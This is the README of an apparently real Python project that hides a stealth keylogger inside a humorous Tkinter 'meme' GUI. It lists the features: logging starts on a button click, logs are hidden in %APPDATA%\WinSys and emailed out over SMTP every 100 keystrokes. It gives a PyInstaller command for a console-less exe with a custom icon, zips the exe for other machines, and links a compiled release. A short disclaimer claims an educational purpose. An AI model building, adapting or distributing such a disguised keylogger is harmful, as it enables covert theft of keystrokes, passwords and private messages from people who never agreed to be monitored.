### 📄 `README.md` :

```markdown
# 🎭 Meme GUI + Stealth Keylogger (Educational Project)

This is a fun and educational Python project combining:
- a humorous GUI (with moving buttons and rainbow background)
- a stealthy keylogger that activates **only after interaction**

> ✅ Intended for **learning, cybersecurity awareness, and ethical testing only**.

---

## 🧩 Features

- 🤡 Meme-style GUI using Tkinter
- 🎯 Keylogger activated **only when Button 2 is clicked**
- 📁 Saves logs in `%APPDATA%\WinSys\keylog.txt`
- 📧 Sends logs automatically to a configured email address every 100 keystrokes
- ♻️ Log file resets after each email
- 🖼️ Custom image (`wayg.jpg`) embedded in `.exe`
- 🧪 Fully functional compiled `.exe` with:
  - No console window
  - Embedded icon (`wayg.ico`)
  - Clean `.zip` for testing on other machines

---

## 📦 Project Structure

```
Memes_Projects/
├── assets/
│   └── wayg.jpg         # Image shown in popup
├── wayg.ico             # App icon (for .exe)
├── Why_are_you01.py     # Final Python script (GUI + Keylogger)
├── Why_are_you.zip      # Compiled executable (in dist/) zipped
├── README.md            # You are here!
```

---

## 💻 Technologies Used

- Python 3
- Tkinter (GUI)
- Pynput (keyboard capture)
- Pillow (image support)
- SMTPLib (email)
- PyInstaller (compilation to `.exe`)

---

## ⚙️ Email Configuration

Update this part of the script:

```python
sender_email = "your_outlook_address"
receiver_email = "your_outlook_address"
password = "your_outlook_app_password"
```

> Use an [Outlook App Password](https://support.microsoft.com/en-us/account-billing/create-app-passwords-in-outlook-com-6ce6f852-f14c-4a07-afc1-5e96091f3f50)  
> Make sure to allow SMTP on your account.

---

## 🚀 How to Compile

```bash
pyinstaller --onefile --noconsole --icon=wayg.ico --add-data "assets\\wayg.jpg;assets" --hidden-import=pynput Why_are_you01.py
```

- Output file: `dist/Why_are_you01.exe`
- Create zip:

```bash
Compress-Archive -Path .\dist\Why_are_you01.exe -DestinationPath .\Why_are_you.zip
```

---

## ⚠️ Legal Disclaimer

This project is provided for educational and ethical purposes only.  
❌ Do NOT use it without the explicit consent of the device owner.  
✅ Learn responsibly. Test legally.

---

## 👨‍💻 Author

- GitHub: [HelloLou](https://github.com/HelloLou)
- Email: ask_me
- Project: [Memes_Projects](https://github.com/HelloLou/Memes_Projects)

---

## 📥 Release

The latest compiled `.exe` is available in the [Releases](https://github.com/HelloLou/Memes_Projects/releases) section.

```

